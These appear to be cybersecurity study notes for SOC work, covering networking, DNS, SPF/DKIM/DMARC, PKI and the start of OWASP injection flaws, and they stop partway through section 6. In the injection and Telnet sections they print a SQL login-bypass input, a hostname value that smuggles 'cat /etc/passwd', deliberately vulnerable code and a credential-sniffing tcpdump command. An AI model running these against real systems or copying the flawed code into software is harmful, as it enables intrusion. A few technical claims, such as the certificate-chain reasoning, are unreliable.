
RQ NOTES

---

## TABLE OF CONTENTS
1. Core Fundamentals (CIA, AAA, Networking Basics)
2. Networking Fundamentals (IP, TCP/UDP, Ports)
3. DNS & Domain Security
4. Email Security Deep-Dive (SPF/DKIM/DMARC)
5. Cryptography & PKI
6. Web Application Security (OWASP Top 10)
7. Malware & Threat Analysis
8. Attack Frameworks (Kill Chain, MITRE, Pyramid of Pain)
9. Incident Response & SOC Operations
10. Authentication & Access Control (MFA, Kerberos, OAuth)
11. Active Directory Deep-Dive
12. Tools & Commands Reference
13. Red Flags & Detection Patterns
14. 100+ Scenario-Based Q&A

---

# 1. CORE FUNDAMENTALS (CIA, AAA, NETWORKING BASICS)

## CIA Triad (Confidentiality, Integrity, Availability)

**The Three Pillars of Cybersecurity**

### Confidentiality
- **Definition**: Only authorized users can access information.
- **Threats**: Data breaches, eavesdropping, unauthorized disclosure.
- **Mitigations**: Encryption (TLS, IPSec, AES), access controls (RBAC, MAC), VPN, DLP.
- **SOC Context**: Monitor for unauthorized file access, data exfiltration attempts (FTP, HTTP to unknown IPs), unusual download volumes.
- **Real Scenario**: User account compromised, attacker downloads customer database to USB → loss of confidentiality.

### Integrity
- **Definition**: Data remains unaltered and trustworthy; only authorized changes allowed.
- **Threats**: Man-in-the-middle (MITM), malware modifying files, SQL injection, replay attacks, tampering.
- **Mitigations**: Hashing (SHA256, MD5), digital signatures, code signing, checksums, HMAC, file integrity monitoring (FIM).
- **SOC Context**: Monitor for unexpected file modifications, registry changes, log tampering, DNS poisoning.
- **Real Scenario**: Attacker modifies web page source code → users receive malicious content → loss of integrity.

### Availability
- **Definition**: Systems and services remain accessible and functional when needed.
- **Threats**: DDoS attacks, ransomware, hardware failure, power outages, intentional downtime.
- **Mitigations**: Redundancy, load balancing, disaster recovery, incident response, DDoS mitigation (Cloudflare, Akamai).
- **SOC Context**: Monitor for service outages, unusual network traffic spikes, CPU/memory exhaustion, connection resets.
- **Real Scenario**: Ransomware locks files → systems go offline → loss of availability.

---

## AAA Model (Authentication, Authorization, Accountability)

### Authentication (You Are Who You Say You Are)
- **Definition**: Proving user identity through credentials.
- **Methods**:
  - **Something you know**: Passwords, passphrases, PINs.
  - **Something you have**: Smart cards, hardware tokens (FIDO2, YubiKey), one-time passwords (OTP).
  - **Something you are**: Biometrics (fingerprint, facial recognition, iris).
  - **Something you do**: Behavioral biometrics (typing patterns, mouse movement).
- **Multi-Factor Authentication (MFA)**: Combining 2+ methods (e.g., password + SMS OTP).
- **SOC Context**: Monitor for failed login attempts, password spray attacks, credential stuffing, compromised credentials in threat feeds.
- **Interview Q**: "Why is MFA better than just password?" → Answer: Single factor (password) can be stolen via phishing, brute force, or breach. MFA requires attacker to compromise 2+ independent factors (harder, slower, more detectable).

### Authorization (What Are You Allowed to Do?)
- **Definition**: Determining what authenticated user can access/do.
- **Models**:
  - **RBAC (Role-Based Access Control)**: User → Role → Permissions. Example: Admin, Editor, Viewer.
  - **ABAC (Attribute-Based Access Control)**: Fine-grained control based on attributes (user department, time of day, location, resource classification).
  - **MAC (Mandatory Access Control)**: OS enforces access based on security labels (e.g., Secret, Confidential, Public).
- **SOC Context**: Monitor for privilege escalation, lateral movement, unusual permission changes, access to sensitive directories.
- **Real Scenario**: User assigned to wrong role → accesses financial reports they shouldn't see → authorization violation.

### Accountability (Who Did What When?)
- **Definition**: Tracking and auditing user actions; non-repudiation (user can't deny actions).
- **Implementation**: Audit logs, SIEM, security information and event management, digital signatures, chain of custody.
- **What to Log**: User login/logout, file access, privilege changes, data transfers, configuration changes.
- **SOC Context**: Investigate who accessed what file, when actions occurred, cross-reference with alerts and timelines.
- **Real Scenario**: Insider threat suspected → audit logs show user X accessed sensitive files at 2 AM → accountability established.

---

## Threat vs Vulnerability vs Risk

### Vulnerability
- **Definition**: Weakness in system, software, process, or human.
- **Examples**: Unpatched software, weak passwords, social engineering, misconfigured firewall.
- **Scope**: Can exist without active threat.
- **Example**: CVE-2024-XXXXX in Apache allows remote code execution.

### Threat
- **Definition**: Potential danger; entity or action that could exploit vulnerability.
- **Examples**: Malware, hacker, insider, script kiddie, nation-state, natural disaster.
- **Scope**: Can exist without vulnerability (threat to patch systems if humans can't patch fast enough).
- **Example**: APT28 group targets energy sector using zero-days.

### Risk
- **Definition**: Probability that threat will exploit vulnerability and cause impact.
- **Formula**: Risk = Likelihood × Impact
- **Risk Calculation Example**:
  - Vulnerability: Weak password policy allows easy brute force.
  - Threat: Attacker attempts login from internet.
  - Likelihood: High (attacker likely to try).
  - Impact: Critical (admin account compromise).
  - Risk: HIGH (high likelihood + critical impact).
- **SOC Context**: Prioritize incidents based on risk (critical vulnerabilities + active threats = highest priority).

---

# 2. NETWORKING FUNDAMENTALS (IP, TCP/UDP, PORTS)

## OSI Model (7 Layers)

| Layer | Name | Function | Examples | Protocol/Tech |
|-------|------|----------|----------|---------------|
| 7 | Application | User services | HTTP, SMTP, DNS, FTP, SSH | Browsers, email, DNS resolvers |
| 6 | Presentation | Data translation/encryption | SSL/TLS, JPEG, ASCII | Encryption, compression |
| 5 | Session | Connection management | RPC, NetBIOS | Session tokens |
| 4 | Transport | End-to-end delivery | TCP, UDP, SCTP | Port numbers, reliability |
| 3 | Network | Routing, logical addressing | IP (IPv4, IPv6), ICMP | IP address, routing tables |
| 2 | Data Link | MAC addressing, frame delivery | Ethernet, PPP, ARP | MAC address, switches |
| 1 | Physical | Bits, cables, signals | Copper, fiber, RF | Network cables |

---

## IP (Internet Protocol)

### IPv4
- **Address Format**: 32-bit, written as dotted decimal (e.g., 192.168.1.1).
- **Classes** (legacy, mostly unused):
  - Class A: 1.0.0.0 to 126.255.255.255 (large networks).
  - Class B: 128.0.0.0 to 191.255.255.255 (medium networks).
  - Class C: 192.0.0.0 to 223.255.255.255 (small networks).
- **Private (RFC 1918)**: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 (internal networks).
- **Special**:
  - 127.0.0.1: Localhost (loopback).
  - 0.0.0.0: Default route / "any address."
  - 255.255.255.255: Broadcast.
- **SOC Context**: Monitor private IP ranges for data exfiltration (traffic to external IPs is abnormal); watch for spoofed IPs.

### IPv6
- **Address Format**: 128-bit, written in hexadecimal with colons (e.g., 2001:db8::1).
- **Scope**: Adoption growing; many networks still IPv4-only.
- **SOC Context**: Some organizations disable IPv6 or misconfigure it → tunnel traffic to avoid detection.

### ICMP (Internet Control Message Protocol)
- **Use**: Diagnostics and error reporting (ping, traceroute).
- **Types**:
  - Type 8: Echo Request (ping request).
  - Type 0: Echo Reply (ping response).
  - Type 11: Time Exceeded (traceroute response).
- **SOC Context**: Excessive ICMP can indicate network scanning or DDoS; ICMP tunneling can hide C2 traffic.

---

## TCP (Transmission Control Protocol) vs UDP (User Datagram Protocol)

### TCP (Connection-Oriented, Reliable)
- **Handshake**: 3-way (SYN, SYN-ACK, ACK).
- **Flow Control**: Ensures all packets arrive in order.
- **Uses**: HTTP, HTTPS, SMTP, SSH, Telnet, FTP.
- **Flags**:
  - **SYN**: Start connection.
  - **ACK**: Acknowledge receipt.
  - **FIN**: Finish/close connection.
  - **RST**: Reset connection (abrupt close).
  - **PSH**: Push data immediately.
  - **URG**: Urgent data.
- **SOC Context**: Detect port scans (SYN scans, half-open connections), unusual flag combinations (SYN-RST may indicate scanning), connection state anomalies.

### UDP (Connectionless, Fast, Unreliable)
- **No Handshake**: Datagrams sent immediately.
- **Best Effort**: Packets can be lost; no guaranteed delivery.
- **Uses**: DNS, DHCP, NTP, VoIP, online gaming, streaming.
- **Advantage**: Low latency (good for real-time apps).
- **SOC Context**: Large UDP floods indicate DDoS (DNS amplification, NTP reflection); watch for tunneling over DNS (DNS exfiltration).

---

## TCP 3-Way Handshake (Deep-Dive)

```

Client (SYN)                Server
|------- SYN(seq=1000) ------>|
|                              | (Server listens, SYN received)
|<---- SYN-ACK(seq=2000, ack=1001) -----|
| (Client confirms receipt)
|------- ACK(seq=1001, ack=2001) ------>|
|                              | (Connection established)
|<===== Data Exchange ========>|

```

- **Step 1 (SYN)**: Client initiates; sends sequence number (ISN).
- **Step 2 (SYN-ACK)**: Server acknowledges client's seq, sends its own seq.
- **Step 3 (ACK)**: Client acknowledges server's seq; connection ready.
- **Attack**: SYN flood sends many SYN packets without completing handshake → server resources exhausted → DoS.
- **Defense**: SYN cookies, rate limiting, firewalls.

---

## Port Numbers (Comprehensive)

### Well-Known Ports (0-1023)
Assigned by IANA; typically require privileged access to bind.

| Port | Protocol | Service | Notes |
|------|----------|---------|-------|
| 20/21 | TCP | FTP (File Transfer Protocol) | Port 20 = data, 21 = control. **Plaintext credentials** → shifted to SFTP/SCP (over SSH). |
| 22 | TCP | SSH (Secure Shell) | Encrypted remote access. Default for Linux/servers. |
| 23 | TCP | Telnet | **DEPRECATED**. Plaintext credentials (replaced by SSH). |
| 25 | TCP | SMTP | Email submission from client to server. Often blocked by ISPs to prevent spam. |
| 53 | TCP/UDP | DNS | Domain Name System. UDP for queries (fast); TCP for zone transfers. |
| 67/68 | UDP | DHCP | Dynamic Host Configuration Protocol. Server (67) ↔ Client (68). |
| 69 | UDP | TFTP | Trivial FTP. Lightweight, no auth; used in PXE boot. |
| 80 | TCP | HTTP | Unencrypted web. |
| 110 | TCP | POP3 | Post Office Protocol (email retrieval). |
| 143 | TCP | IMAP | Internet Message Access Protocol (email). Encrypted = IMAPS (port 993). |
| 161 | UDP | SNMP | Simple Network Management Protocol. Monitoring; **weak auth by default**. |
| 162 | UDP | SNMP Trap | SNMP alerts. |
| 179 | TCP | BGP | Border Gateway Protocol. Routing between AS (autonomous systems). |
| 389 | TCP/UDP | LDAP | Lightweight Directory Access Protocol. User/group info. |
| 443 | TCP | HTTPS | Encrypted web (TLS/SSL). |
| 445 | TCP | SMB | Server Message Block. Windows file/printer sharing. **Target for ransomware (EternalBlue)**. |
| 465 | TCP | SMTPS | SMTP over SSL (deprecated; use 587). |
| 587 | TCP | SMTP TLS | SMTP with STARTTLS. Modern email submission. |
| 636 | TCP | LDAPS | LDAP over SSL. |
| 993 | TCP | IMAPS | IMAP over SSL. |
| 995 | TCP | POP3S | POP3 over SSL. |

### Registered Ports (1024-49151)
Available for applications to register with IANA.

| Port | Protocol | Service | Notes |
|------|----------|---------|-------|
| 1433 | TCP | SQL Server | Microsoft database; **often exploited if exposed**. |
| 1521 | TCP | Oracle | Oracle database; **credential stuffing target**. |
| 3306 | TCP | MySQL | Open-source database. |
| 3389 | TCP | RDP | Remote Desktop Protocol. Windows remote access; **brute-force target**. |
| 5432 | TCP | PostgreSQL | Open-source database. |
| 5900 | TCP | VNC | Virtual Network Computing (remote desktop). |
| 8080 | TCP | HTTP Alternate | Web server on non-standard port; also common proxy port. |
| 8443 | TCP | HTTPS Alternate | HTTPS on non-standard port. |
| 9200 | TCP | Elasticsearch | Search/analytics; **often exposed without auth**. |
| 9997 | TCP | Splunk | Splunk default port; **seen in malware C2 and legit SIEM**. |
| 27017 | TCP | MongoDB | NoSQL database; **injection target**. |
| 3000-8000 | Various | Development | Development servers often expose sensitive services. |
| 6379 | TCP | Redis | In-memory cache; **no auth by default**. |
| 5601 | TCP | Kibana | Elasticsearch UI; **often exposed**. |

### Dynamic/Private Ports (49152-65535)
Ephemeral ports assigned by OS for outbound connections.

---

## Why Telnet → SSH (Detailed Reasoning)

### Telnet (Port 23) – The Problem
1. **No Encryption**: All traffic (including passwords) sent in plaintext.
   - Attacker on same LAN can sniff credentials with tools like `tcpdump`, `Wireshark`.
   - Attacker with router access can intercept traffic.
   - Attacker on compromised ISP/backbone can intercept globally.
2. **No Strong Authentication**:
   - Only username/password; vulnerable to brute force.
   - No server authentication; susceptible to MITM attacks (attacker impersonates server).
3. **No Integrity Checking**: MITM attacker can modify commands in-flight.
4. **No Key Exchange**: Stateless, no secure channel establishment.
5. **No Modern Protections**: Built in 1969 (before internet security standards).

**Real Attack Scenario**:
- User connects to Telnet server via public Wi-Fi.
- Attacker on same network runs: `tcpdump -i wlan0 -A 'port 23'`.
- Attacker captures plaintext login: `admin:P@ssw0rd123`.
- Attacker gains full access to server.

### SSH (Port 22) – The Solution
1. **End-to-End Encryption**: All traffic encrypted using AES, 3DES, or ChaCha20.
   - Even if captured on wire, traffic is unreadable without keys.
2. **Strong Authentication**:
   - Password + optional key-based auth (RSA, ECDSA, ED25519).
   - Server authentication via host key fingerprint.
   - Protects against MITM (user verifies server key on first connection).
3. **Integrity Protection**: HMAC ensures no tampering.
4. **Perfect Forward Secrecy (PFS)**: Session keys expire; past sessions unrecoverable even if private key stolen.
5. **Key Exchange**: Diffie-Hellman or ECDH to establish shared secret securely.

**Modern Security Alignment**:
- **Confidentiality** ✓ (encryption).
- **Integrity** ✓ (HMAC).
- **Authenticity** ✓ (key verification).

**Interview Q**: "Why is SSH better than Telnet?"
**Answer**: "Telnet sends credentials in plaintext; any attacker on the network can sniff them. SSH uses encryption (AES) and authentication (keys or hashed passwords), so traffic is unreadable even if captured. SSH also verifies the server's identity via host key, preventing MITM. This aligns with the CIA triad: confidentiality (encryption), integrity (HMAC), authenticity (key verification)."

---

# 3. DNS & DOMAIN SECURITY

## DNS Resolution (Full Process)

```

User Types: example.com in Browser
↓
Resolver (usually ISP or corporate) receives query[^1]
↓
Root Nameserver (asked: "Where is .com?")[^2]
↓
TLD Nameserver for .com (asked: "Where is example.com?")[^3]
↓
Authoritative Nameserver for example.com (returns: A 93.184.216.34)[^4]
↓
Resolver caches response, returns to user[^5]
↓
Browser connects to IP 93.184.216.34[^6]

```

### DNS Query Types
- **Recursive Query**: Resolver does all work; returns final answer (or SERVFAIL).
- **Iterative Query**: Nameserver returns pointer to next server; requester follows chain.
- **Non-Recursive Query**: Resolver already has answer in cache.

### DNS Record Types (SOC-Relevant)

| Type | Purpose | Example | SOC Use |
|------|---------|---------|---------|
| **A** | IPv4 address | example.com → 93.184.216.34 | Identify C2 infrastructure, detect DGA domains. |
| **AAAA** | IPv6 address | example.com → 2606:2800:220:1:... | Less common but increasingly monitored. |
| **MX** | Mail exchanger | example.com MX mail.example.com | Phishing investigation, mail server enumeration. |
| **TXT** | Text records | SPF, DKIM, DMARC policies | Email authentication verification. |
| **CNAME** | Alias | blog.example.com → example.com | Subdomain enumeration, CDN/proxy detection. |
| **NS** | Nameserver | example.com NS ns1.dns-provider.com | Domain takeover risk if misconfigured. |
| **SOA** | Start of Authority | Serial, refresh, retry, expire | Zone transfer source of truth. |
| **PTR** | Reverse DNS | 93.184.216.34 → example.com | IP reputation, mail server validation. |

---

## DNS Security Issues

### DNS Spoofing / Cache Poisoning
- **Attack**: Attacker injects false DNS records into resolver cache.
- **Result**: Users redirected to attacker's server instead of legitimate site.
- **Example**:
  - User tries to visit `bank.com`.
  - Attacker's DNS response (forged) says: `bank.com → 10.10.10.10` (attacker's phishing server).
  - User lands on phishing site, enters credentials.
- **Defense**: DNSSEC (digital signatures on records), source port randomization.

### DNS Amplification DDoS
- **Attack**: Attacker sends small DNS query with spoofed source IP (victim's IP).
- **Result**: DNS servers send large response to victim, amplifying traffic.
- **Example**:
  - Attacker sends: `QUERY example.com` with source IP = victim.
  - DNS server responds with large TXT record (16 KB) to victim.
  - Attacker repeats 1000x/sec → victim receives 16 GB/sec traffic → service down.
- **Defense**: Rate limiting on DNS servers, firewall rules, ISP filtering.

### DNS Tunneling / Data Exfiltration
- **Attack**: Attacker encodes data in DNS queries/responses; bypasses firewall rules.
- **Example**:
  - Malware on compromised host queries: `SGVsbG8gV29ybGQgZmlsZWRhdGEucGluZ3RvLm1lLmNvbQ==.example.com` (base64 data inside subdomain).
  - Attacker's DNS server receives query, decodes data.
  - Response tunnels commands back.
- **Defense**: Monitor for suspicious DNS patterns, limit DNS queries, DNS content filtering (Cisco Umbrella, Cloudflare).

### DGA Domains (Domain Generation Algorithm)
- **What**: Malware generates pseudo-random domain names on the fly.
- **Why**: Harder to block; attacker controls which generated domain is "active" C2.
- **Example**: Conficker malware generated 50,000 domains daily.
- **Detection**: Monitor for queries to many non-existent domains, unusual domain patterns.

---

## DNSSEC (DNS Security Extensions)

- **What**: Adds cryptographic signing to DNS records.
- **How**:
  1. Authoritative server signs records with private key.
  2. Public key published in DNSKEY record.
  3. Resolver verifies signature; rejects unsigned or incorrectly signed records.
- **Benefit**: Prevents DNS spoofing and cache poisoning.
- **Limitation**: Doesn't protect confidentiality (queries still readable); doesn't prevent DDoS.

---

# 4. EMAIL SECURITY DEEP-DIVE (SPF/DKIM/DMARC)

## Email Flow (Simplified)

```

Sender (Alice@acme.com)
↓
Sender's SMTP Server (mail.acme.com)
↓
Internet (SMTP)
↓
Recipient's SMTP Server (mail.recipient.com)
↓
Recipient's Mailbox

```

---

## SPF (Sender Policy Framework)

### What & How
- **Definition**: TXT record listing servers authorized to send mail for a domain.
- **Implementation**: Domain publishes SPF record at DNS.
- **Check**: Receiver compares email's source IP against SPF record.

### SPF Record Example
```

acme.com TXT "v=spf1 ip4:192.0.2.0 include:_spf.google.com ~all"

```

**Breakdown**:
- `v=spf1`: Version 1 of SPF.
- `ip4:192.0.2.0`: This IP can send mail for acme.com.
- `include:_spf.google.com`: Also allow Google's mail servers (if using Google Workspace).
- `~all`: Soft fail for all others (accept but mark as suspicious).
- Alternative: `-all` (hard fail; reject all others).

### SPF Validation Results
- **Pass**: Email from authorized IP.
- **Fail**: Email from unauthorized IP.
- **SoftFail (~)**: Probably not authorized; recipient can accept or flag.
- **Neutral**: No policy defined.
- **None**: No SPF record.

### SPF Limitations
1. **Only checks envelope-from (5321.From)**, not display From header (5322.From).
   - Attacker can spoof display name while using authorized IP.
2. **Broken by forwarding**: Forward breaks chain (email re-sent from forwarder's IP).
   - Solution: Sender Rewriting Scheme (SRS).
3. **No integrity**: Doesn't prevent message tampering.

### SOC Phishing Check
```

Email received from: "support@acme.com"
Step 1: Extract envelope-from via header inspection.
Step 2: Check SPF record for acme.com (DNS lookup).
Step 3: Verify sender IP matches SPF record.
Step 4: If SPF fails + domain is known to organization → likely phishing.

```

---

## DKIM (DomainKeys Identified Mail)

### What & How
- **Definition**: Uses public-key cryptography to verify email authenticity and integrity.
- **How**:
  1. Mail server signs email with private key (DKIM-Signature header added).
  2. Domain publishes public key in DNS as TXT record.
  3. Receiver verifies signature using public key.
  4. If signature valid → email truly from domain + not tampered.

### DKIM Record Example (DNS)
```

default._domainkey.acme.com TXT "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA..."

```

**Breakdown**:
- `default._domainkey`: DKIM selector (domain can have multiple selectors for key rotation).
- `v=DKIM1`: DKIM version.
- `k=rsa`: Key type (RSA).
- `p=...`: Public key (RSA public key).

### DKIM Signature (in email header)
```

DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=acme.com; s=default; h=from:to:subject:date; bh=...; b=...

```

**Breakdown**:
- `a=rsa-sha256`: Algorithm (RSA with SHA-256).
- `d=acme.com`: Domain signing.
- `s=default`: Selector.
- `h=from:to:subject:date`: Headers signed.
- `bh=...`: Body hash.
- `b=...`: Signature (encrypted hash).

### DKIM Validation Results
- **Pass**: Signature valid; message unchanged.
- **Fail**: Signature invalid or doesn't match domain.
- **Neutral**: No DKIM signature present.

### DKIM Advantages Over SPF
- Survives forwarding (signature stays valid).
- Protects message integrity (hash detects tampering).
- Works with multiple domains/services.

---

## DMARC (Domain-based Message Authentication, Reporting and Conformance)

### What & How
- **Definition**: Policy framework on top of SPF + DKIM.
- **Purpose**: Define handling rules for authentication failures + request reports.

### DMARC Record Example
```

_dmarc.acme.com TXT "v=DMARC1; p=quarantine; rua=mailto:dmarc@acme.com; ruf=mailto:forensics@acme.com; fo=1; rf=afrf; aspf=r"

```

**Breakdown**:
- `v=DMARC1`: DMARC version.
- `p=quarantine`: Policy if auth fails:
  - `none`: No action (monitoring only).
  - `quarantine`: Move to spam folder.
  - `reject`: Reject email entirely.
- `rua=mailto:dmarc@acme.com`: Send aggregate reports (daily summary).
- `ruf=mailto:forensics@acme.com`: Send forensic reports (detailed failure data).
- `fo=1`: Forensic report options (1 = report if SPF or DKIM fails).
- `rf=afrf`: Forensic report format (AFRF = Authentication Failure Reporting Format).
- `aspf=r`: DKIM/SPF alignment policy (strict or relaxed).

### DMARC Alignment
- **SPF Alignment**: Domain in envelope-from must match domain in From header (strict) or organizational domain (relaxed).
- **DKIM Alignment**: Domain in DKIM signature must match From header (strict) or organizational domain (relaxed).

### DMARC Validation Results
- **Pass**: SPF and/or DKIM aligned + auth passes.
- **Fail**: SPF/DKIM failed + not aligned.

### DMARC Reports
- **Aggregate Report** (RUA): XML daily summary of auth results.
  - Example: "1000 emails passed DKIM, 50 failed SPF, 20 failed alignment."
- **Forensic Report** (RUF): Detailed per-email failure info.
  - Example: Exact headers, timestamps, auth results for each failed email.

---

## SPF/DKIM/DMARC in Phishing Analysis

### Email Header Inspection Checklist
```

From: noreply@acme.com
Sender: sender@acme.com
Return-Path: bounce@acme.com
Authentication-Results: acme.com
spf=pass smtp.mailfrom=acme.com
dkim=pass header.d=acme.com header.s=default
dmarc=pass

```

**Red Flags**:
- SPF/DKIM/DMARC all `fail` → email spoofed.
- `From` domain differs from `Return-Path` / `Sender` → suspicious.
- Lack of authentication headers → no auth configured (risky).

### Case Study: Phishing Email Detection

**Scenario**:
- User reports email from "support@acme.com" asking to verify password.
- Email body: "Click here to re-verify your account."
- Link goes to: `acme-verify.xyz` (attacker domain).

**SOC Analysis**:

1. **Header Inspection**:
```

From: support@acme.com
Return-Path: bounce@attacker.com  ← MISMATCH!
Authentication-Results:
spf=fail (1.2.3.4 not in acme.com SPF record)
dkim=fail (signature domain: attacker.com)
dmarc=fail (spf/dkim not aligned)

```

2. **SPF Check**: Domain is acme.com; email source IP 1.2.3.4 not in SPF → **FAIL**.

3. **DKIM Check**: DKIM signature domain is attacker.com, not acme.com → **FAIL**.

4. **DMARC Check**: SPF/DKIM failed + no alignment → **FAIL**.

5. **Link Analysis**: Hover over link → `acme-verify.xyz` (not acme.com) → credential phishing confirmed.

6. **Action**: Block sender, quarantine email, alert user.

---

# 5. CRYPTOGRAPHY & PKI

## Hashing vs Encryption

### Hashing
- **Definition**: One-way function; input → fixed-length hash. Cannot reverse.
- **Purpose**: Integrity verification, password storage, fingerprinting.
- **Properties**:
- Deterministic: Same input = same hash.
- Avalanche effect: Tiny input change = completely different hash.
- Collision-resistant: Hard to find two inputs with same hash.
- **Common Algorithms**:
- **MD5** (128-bit): ❌ Broken (collisions found); deprecated.
- **SHA-1** (160-bit): ⚠️ Weak (collisions possible); avoid for security.
- **SHA-256** (256-bit): ✅ Secure; standard.
- **SHA-512** (512-bit): ✅ Very secure; paranoid.
- **bcrypt**: ✅ Slow, designed for passwords.
- **PBKDF2**: ✅ Key derivation, password storage.
- **Argon2**: ✅ Modern, GPU-resistant password hashing.

**Example**:
```

Input: "password123"
MD5: 482c811da5d5b4bc6d497ffa98491e38
SHA-256: ef92b778bafe771e89245d171bafae2c0ce58494fe20e9ad0b2c69d37b06c4a6

```

### Encryption
- **Definition**: Two-way function; plaintext + key → ciphertext; reverse with key.
- **Purpose**: Confidentiality (protecting data).
- **Types**:
  - **Symmetric**: Same key for encrypt/decrypt. Fast.
  - **Asymmetric**: Public key (encrypt) + private key (decrypt). Slower.

### Use Cases
| Scenario | Hash | Encryption |
|----------|------|------------|
| Store passwords safely | ✓ | ✗ (shouldn't be reversible) |
| Detect file tampering | ✓ | ✗ (need irreversibility) |
| Hide data in transit | ✗ | ✓ |
| Digital signatures | ✓ (sign hash) | ✓ (public key crypto) |
| Password recovery | ✗ | ✗ (hash can't be reversed; use password reset) |

---

## Symmetric Encryption

### How It Works
```

Alice                          Bob
plaintext                      plaintext
↓ (encrypt w/ shared key)        ↑ (decrypt w/ shared key)
ciphertext ←→ insecure channel ←→ ciphertext

```

### Common Algorithms
- **AES (Advanced Encryption Standard)** ✅
  - 128, 192, or 256-bit key.
  - Industry standard; used in TLS, VPN, full-disk encryption.
  - Modes: ECB (bad), CBC, CTR, GCM.
- **3DES (Triple DES)**: ⚠️ Deprecated (slow, small block size).
- **Blowfish/Twofish**: Older; still used in some systems.
- **ChaCha20**: Modern, fast; used in TLS 1.3.

### Key Management Problem
- **Challenge**: How do Alice and Bob agree on secret key over insecure channel?
- **Solution**: Asymmetric encryption (Diffie-Hellman key exchange, TLS handshake).

---

## Asymmetric Encryption (Public-Key Cryptography)

### How It Works
```

Alice publishes: Public Key A (can encrypt)
Alice keeps secret: Private Key A (can decrypt)

Anyone (Bob) can:

1. Get Alice's public key (from keyserver, certificate).
2. Encrypt message with public key A.
3. Send to Alice.

Only Alice can:
4. Decrypt with private key A.

```

### Common Algorithms
- **RSA** (Rivest-Shamir-Adleman):
  - Key size: 2048, 4096 bits (larger = slower but more secure).
  - Standard for email (PGP), VPN, code signing.
- **ECC** (Elliptic Curve Cryptography):
  - Smaller key sizes, same security as RSA.
  - Faster; used in modern TLS (ECDHE).
- **Ed25519**: Modern ECC variant; used in SSH keys, TLS.

### Use Cases
1. **Encryption**: Bob encrypts message with Alice's public key; Alice decrypts with private key.
2. **Digital Signatures**: Alice signs with private key; others verify with public key (proves Alice authored message).
3. **Key Exchange**: DH/ECDHE to establish shared symmetric key over insecure channel.

---

## PKI (Public Key Infrastructure)

### What It Is
- System for managing public keys, certificates, trust.
- Components: CAs (Certificate Authorities), certificates, key pairs, revocation mechanisms.

### X.509 Certificates
- **What**: Document binding public key to identity.
- **Contents**:
  - Subject (who the cert is for): CN=example.com, O=Example Inc.
  - Issuer (who signed it): C=US, O=Verisign.
  - Public Key.
  - Validity period (Not Before, Not After).
  - Serial number, signature algorithm, signature.

**Example (decoded)**:
```

Certificate:
Data:
Version: 3
Serial Number: 01:23:45:67
Signature Algorithm: sha256WithRSAEncryption
Issuer: CN=Verisign, O=Verisign
Subject: CN=example.com, O=Example Inc
Not Before: Jan 1, 2024
Not After: Dec 31, 2025
Public Key:
Algorithm: rsaEncryption
Public-Key: (2048 bit)
[RSA key data]
Extensions:
Subject Alt Name: example.com, www.example.com
Authority Key Id: [CA's key ID]
Subject Key Id: [This cert's key ID]
Signature Algorithm: sha256WithRSAEncryption
Signature Value: [Digital signature]

```

### Trust Chain
```

Root CA (self-signed)
↓ (signs)
Intermediate CA
↓ (signs)
End-Entity Certificate (for example.com)

```

- **Root CA**: Self-signed; installed in browser/OS trust store.
- **Intermediate CA**: Signs end-entity certs; issued by Root.
- **End-Entity Cert**: Your website/server's cert; issued by Intermediate.

**Why Chain?** If Root key compromised, only revoke Intermediate → other Intermediate CAs still trusted.

### Certificate Validation (Browser)
1. Server sends certificate to client.
2. Client extracts public key and validates signature using Issuer's public key.
3. Client validates certificate chain to Root.
4. Client checks certificate hasn't expired or been revoked (CRL/OCSP).
5. Client verifies cert Subject matches domain in URL.
6. If all valid → "🔒 Secure" padlock appears.

### Certificate Revocation
- **CRL (Certificate Revocation List)**: Signed list of revoked serial numbers; checked infrequently (stale data).
- **OCSP (Online Certificate Status Protocol)**: Real-time query to CA; slower but current.
- **OCSP Stapling**: Server caches OCSP response, provides to client (faster).

### Common Certificate Issues (SOC Detection)
- **Self-signed cert**: Subject = Issuer (browser warning). Common on internal services or attacker servers.
- **Expired cert**: Not After date passed. Common on compromised servers or legacy systems.
- **Cert mismatch**: Subject doesn't match requested domain. Browser warning; indicates MITM or misconfiguration.
- **Untrusted CA**: Issuer not in trust store. Attacker-controlled CA or corporate proxy.

---

# 6. WEB APPLICATION SECURITY (OWASP TOP 10)

## OWASP Top 10 2021

### 1. Broken Access Control
- **Definition**: Users can access/do unauthorized actions.
- **Examples**:
  - User 1 changes URL from `/profile/1` to `/profile/2` → sees another user's data.
  - Non-admin user accesses `/admin` panel.
  - User modifies request to escalate privileges.
- **Causes**:
  - Missing authorization checks.
  - Insecure direct object references (IDOR).
  - Horizontal/vertical privilege escalation.
- **Mitigation**: Enforce authorization on all requests; principle of least privilege; use RBAC.
- **SOC Detection**: Monitor for 403 (Forbidden) errors followed by successful 200 (OK) responses; unusual access patterns.

### 2. Cryptographic Failures
- **Definition**: Data in transit/at rest not properly encrypted or hashed.
- **Examples**:
  - Passwords stored as plaintext.
  - Sensitive data sent over HTTP (not HTTPS).
  - Weak encryption (DES, RC4).
  - Hardcoded encryption keys in code.
- **Mitigation**:
  - Use HTTPS/TLS for all data in transit.
  - Hash passwords with bcrypt/Argon2.
  - Encrypt sensitive data at rest (AES-256).
  - Rotate encryption keys regularly.
- **SOC Detection**: Monitor for HTTP (unencrypted) traffic carrying credentials; weak ciphers in TLS handshakes.

### 3. Injection (SQLi, OS Command Injection, LDAP Injection)
- **Definition**: Attacker inserts malicious code into application input.

#### SQL Injection (SQLi)
**Vulnerable Code**:
```python
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
db.execute(query)
```

**Attack**:

- Input: `username = admin' --`
- Query becomes: `SELECT * FROM users WHERE username='admin' --' AND password='...'`
- `--` comments out rest; query returns admin user without password check.

**Real-World Impact**:

- Dump entire database.
- Modify/delete data.
- Read files from server.
- Execute OS commands (depending on DB).

**Defense**:

- Parameterized queries (prepared statements):

```python
query = "SELECT * FROM users WHERE username=? AND password=?"
db.execute(query, (username, password))
```

- Input validation (whitelist, length, type).
- ORM frameworks (Django ORM, SQLAlchemy).


#### Command Injection

**Vulnerable Code**:

```bash
cmd = "ping " + hostname
os.system(cmd)
```

**Attack**:

- Input: `hostname = 8.8.8.8; cat /etc/passwd`
- Command: `ping 8.8.8.8; cat /etc/passwd`
- Attacker reads sensitive files.

**Defense**:

- Avoid shell commands; use libraries.
- Input validation.
- Use subprocess with array, not shell=True.


### 4. Insecure Design

- **Definition**: Missing security controls in design phase.
- **Examples**:
